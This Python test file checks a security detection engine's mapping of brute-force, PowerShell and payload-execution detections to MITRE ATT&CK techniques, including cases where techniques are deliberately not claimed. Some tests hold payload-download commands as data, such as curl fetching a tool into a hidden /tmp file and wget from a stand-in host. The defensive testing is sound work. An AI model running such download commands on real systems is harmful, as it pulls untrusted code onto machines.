import dataclasses
import json
from pathlib import Path

import pytest

from src.detection_engine import (
    CREDENTIAL_ATTACK,
    PAYLOAD_EXECUTION,
    SUSPICIOUS_POWERSHELL,
    run_detections,
)
from src.mitre import TECHNIQUE_NAMES, map_detection
from src.normalizer import normalize_events

DATA_FILE = Path(__file__).resolve().parent.parent / "data" / "security_events.json"


@pytest.fixture(scope="module")
def detections():
    events, _ = normalize_events(json.loads(DATA_FILE.read_text(encoding="utf-8")))
    return {detection.name: detection for detection in run_detections(events)}


def ids(techniques):
    return [technique.technique_id for technique in techniques]


def with_details(detection, **changes):
    """Copy of a detection with some ``details`` replaced."""
    return dataclasses.replace(detection, details={**detection.details, **changes})


# --- Expected mappings on the bundled dataset ------------------------------


def test_credential_attack_maps_to_parent_brute_force_only(detections):
    techniques = map_detection(detections[CREDENTIAL_ATTACK])

    assert ids(techniques) == ["T1110"]
    assert techniques[0].technique_name == "Brute Force"
    # Neither sub-technique is claimed: password reuse is not observable.
    assert "T1110.003" not in ids(techniques) and "T1110.001" not in ids(techniques)
    assert "cannot show" in techniques[0].reason


def test_powershell_mappings(detections):
    techniques = map_detection(detections[SUSPICIOUS_POWERSHELL])
    assert ids(techniques) == ["T1059.001", "T1027.010", "T1564.003", "T1105"]


def test_payload_mappings(detections):
    techniques = map_detection(detections[PAYLOAD_EXECUTION])
    assert ids(techniques) == ["T1105", "T1059.004"]
    assert "198.51.100.77" in techniques[0].reason


def test_technique_names_match_attack(detections):
    expected = {
        "T1110": "Brute Force",
        "T1059.001": "Command and Scripting Interpreter: PowerShell",
        "T1059.004": "Command and Scripting Interpreter: Unix Shell",
        "T1027.010": "Obfuscated Files or Information: Command Obfuscation",
        "T1564.003": "Hide Artifacts: Hidden Window",
        "T1105": "Ingress Tool Transfer",
    }
    assert TECHNIQUE_NAMES == expected
    for detection in detections.values():
        for technique in map_detection(detection):
            assert technique.technique_name == expected[technique.technique_id]


def test_every_mapping_has_an_evidence_based_reason(detections):
    for detection in detections.values():
        for technique in map_detection(detection):
            assert len(technique.reason) > 30
            assert technique.url.startswith("https://attack.mitre.org/techniques/T")


def test_reasons_cite_observed_values(detections):
    powershell = {t.technique_id: t for t in map_detection(detections[SUSPICIOUS_POWERSHELL])}
    assert "WINWORD.EXE" in powershell["T1059.001"].reason
    assert "192.0.2.80" in powershell["T1105"].reason
    # 192.0.2.81 was contacted by the dropped file, not by PowerShell.
    assert "192.0.2.81" not in powershell["T1105"].reason


def test_no_duplicate_techniques(detections):
    for detection in detections.values():
        technique_ids = ids(map_detection(detection))
        assert len(technique_ids) == len(set(technique_ids))


def test_url_format(detections):
    techniques = {t.technique_id: t for t in map_detection(detections[SUSPICIOUS_POWERSHELL])}
    assert techniques["T1059.001"].url == "https://attack.mitre.org/techniques/T1059/001/"
    assert techniques["T1105"].url == "https://attack.mitre.org/techniques/T1105/"


# --- Techniques are NOT added without supporting evidence -------------------


def test_powershell_without_encoding_or_hidden_window_gets_only_t1059_001(detections):
    plain = with_details(
        detections[SUSPICIOUS_POWERSHELL],
        command_line="powershell.exe -NoProfile -File C:\\Scripts\\x.ps1",
        powershell_external_ips=[],
    )
    assert ids(map_detection(plain)) == ["T1059.001"]


def test_powershell_file_creation_without_external_connection_is_not_t1105(detections):
    no_network = with_details(detections[SUSPICIOUS_POWERSHELL], powershell_external_ips=[])
    assert "T1105" not in ids(map_detection(no_network))


def test_payload_from_internal_host_is_not_ingress_tool_transfer(detections):
    internal = with_details(
        detections[PAYLOAD_EXECUTION], download_command="curl -o /tmp/.cache-update http://10.0.0.5/tool"
    )
    assert "T1105" not in ids(map_detection(internal))


def test_payload_from_localhost_is_not_ingress_tool_transfer(detections):
    local = with_details(
        detections[PAYLOAD_EXECUTION], download_command="curl -o /tmp/x http://localhost:8080/tool"
    )
    assert "T1105" not in ids(map_detection(local))


def test_payload_from_external_hostname_is_ingress_tool_transfer(detections):
    named = with_details(detections[PAYLOAD_EXECUTION], download_command="wget -O /tmp/x https://tools.example/a")
    assert "T1105" in ids(map_detection(named))


def test_payload_not_started_from_shell_is_not_unix_shell(detections):
    from_python = with_details(detections[PAYLOAD_EXECUTION], execution_parent_process="/usr/bin/python3")
    assert "T1059.004" not in ids(map_detection(from_python))


def test_unknown_detection_gets_no_mapping(detections):
    unknown = dataclasses.replace(detections[CREDENTIAL_ATTACK], name="Some Future Detection")
    assert map_detection(unknown) == []


def test_techniques_that_were_considered_are_not_mapped(detections):
    """Plausible-sounding techniques that the evidence does not support."""
    all_ids = {t.technique_id for d in detections.values() for t in map_detection(d)}
    not_supported = {
        "T1110.001",  # Password Guessing - password reuse not observable
        "T1110.003",  # Password Spraying - password reuse not observable
        "T1078",  # Valid Accounts - a successful login is not proof of adversary use
        "T1566.001",  # Spearphishing Attachment - no email telemetry
        "T1204.002",  # User Execution: Malicious File - document not shown to be malicious
        "T1222.002",  # Linux File Permissions Modification - chmod +x here is not evasion
        "T1071",  # Application Layer Protocol (C2) - connections not shown to be C2
        "T1041",  # Exfiltration Over C2 Channel - no evidence of data transfer
    }
    assert all_ids.isdisjoint(not_supported)
